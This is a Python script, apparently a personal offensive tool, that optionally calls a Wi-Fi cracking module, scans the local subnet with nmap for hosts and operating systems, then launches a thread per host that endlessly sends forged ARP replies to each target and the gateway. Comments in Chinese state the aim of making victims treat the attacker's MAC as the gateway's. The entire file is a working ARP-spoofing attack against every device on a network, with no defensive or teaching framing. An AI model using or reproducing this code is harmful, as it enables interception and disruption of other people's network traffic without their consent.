import netifaces
import nmap
import psutil
from scapy.layers.l2 import getmacbyip, ARP, Ether
import time
from scapy.all import *
import socket
import wifi_crack
import threading

class get_ip(object):
    def __init__(self,tg):
        self.tg = tg

    def scan_tg(self):
        nm = nmap.PortScanner()

        nm.scan(hosts=self.tg, arguments='-sn -PO')
        host_list = []
        num = 0
        for pc in nm.all_hosts():
            tmp_dic = {}
            tmp_dic['id'] = f'{num}'
            host_list.append(tmp_dic)
            print('Host : %s (%s)' % (pc, nm[pc].hostname()))
            tmp_dic['host'] = pc
            mac_address = nm[pc].get('addresses', {}).get('mac', 'Unknown')
            print('mac:',mac_address)
            tmp_dic['mac'] = mac_address
            os_scan = nmap.PortScanner()
            os_scan.scan(hosts=pc, arguments='-O')

            try:
                os_info = os_scan[pc]['osmatch'][0]['name']  # 获取操作系统名称
            except:
                os_info = "Unknown OS"


            print(f"OS: {os_info}")
            num += 1
        return host_list

    def main(self):
        host_list = self.scan_tg()
        # target_host,gateway_host = self.user_select(host_list)
        return host_list

def get_segment():
    ip_list = []
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            ip_addresses = {}
            if addr.family == socket.AF_INET:  # AF_INET 表示 IPv4 地址
                ip_addresses[interface] = addr.address
                ip_list.append(ip_addresses)
    num = 0
    for i in ip_list:
        for k, v in i.items():
            print(f'id:{num} connector:{k} ip:{v}')
            num += 1
    user_select = input('选择扫描网段:')

    a = next(iter(ip_list[int(user_select)].values()))
    return  a,a + r'/24'

def get_default_gateway():
    gateways = netifaces.gateways()
    default_gateway = gateways['default'][netifaces.AF_INET][0]
    a = input(f'当前默认网关地址为{default_gateway}是否需要指定[y/n]:')
    if not a : a ='n'
    if a == 'y':
        return int(input('指定网关ip:'))
    else:
        return default_gateway

class Arp_deceive(object):
    # def __init__(self,t_dic,g_dic):
    #     self.t_dic = t_dic
    #     self.g_dic = g_dic

    def attack(self,l_mac):

        target_mac = getmacbyip(self.t_dic['host'])
        gateway_mac = getmacbyip(self.g_dic)
        l_mac = l_mac.replace("-", ":").lower()
        target_mac = target_mac.replace("-", ":").lower()
        gateway_mac = gateway_mac.replace("-", ":").lower()

        # arp_packet = ARP(op=2, psrc=self.g_dic['host'], pdst=self.t_dic['host'], hwdst=target_mac, hwsrc=l_mac)
        # arp_packet2 = ARP(op=2, psrc=self.t_dic['host'], pdst=self.g_dic['host'], hwdst=gateway_mac, hwsrc=l_mac)
        # while True:
        # 欺骗目标主机，让其认为攻击者的 MAC 是网关的 MAC
        pkt1 = Ether(src=l_mac, dst=target_mac) / ARP(op=2, hwsrc=l_mac, psrc=self.g_dic, hwdst=target_mac,pdst=self.t_dic['host'])
        # 欺骗网关，让其认为攻击者的 MAC 是目标主机的 MAC
        pkt2 = Ether(src=l_mac, dst=gateway_mac) / ARP(op=2, hwsrc=l_mac, psrc=self.t_dic['host'],hwdst=gateway_mac, pdst=self.g_dic)

        sendp(pkt1, verbose=False)
        sendp(pkt2, verbose=False)
        # print(f"发送欺骗数据包到 {self.t_dic['host']} mac:{target_mac} 和 {self.g_dic} mac:{gateway_mac}")
        time.sleep(1.5)



    def main(self,t_dic,g_dic,l_mac):
        print(f"当前线程 ID: {threading.get_ident()} 攻击ip:{t_dic['host']}")
        self.t_dic = t_dic
        self.g_dic = g_dic

        while True:
            self.attack(l_mac)

def local_mac():
    mac_addresses = {}
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:  # AF_LINK 表示 MAC 地址
                mac_addresses[interface] = addr.address

    # 获取所有网卡的 MAC 地址
    mac_addresses = mac_addresses
    mac_list = []
    num = 0
    for interface, mac in mac_addresses.items():
        print(f"id:{num}网卡名称: {interface}, MAC 地址: {mac}")
        mac_list.append(mac)
        num += 1
    local_mac = input('选择本机mac:')
    return mac_list[int(local_mac)]
if __name__ == '__main__':
    while True:
        while True:
            print('------------zeddm----------------')
            u = input('是否更换连接wifi[y/n]:')
            if not u : u = 'y'
            if u == 'y':
                wifi_crack.main()
            t_ip,tg = get_segment()
            a = get_ip(tg=tg)
            h_list = a.main()
            print(h_list)
            g_ip = get_default_gateway()

            del_glist = [  i for i in h_list if i['host'] != f'{g_ip}']
            del_glist = [  i for i in del_glist if i['host'] != f'{t_ip}']

            print(del_glist)
            l_mac = local_mac()
            A = Arp_deceive()
            threads = []
            for j in del_glist:
                thread = threading.Thread(target=A.main,args=(j,g_ip,l_mac))
                threads.append(thread)
                thread.start()
            for i in threads:
                i.join()
        # except:
        #     print('\nctrl+c开启下一次循环')
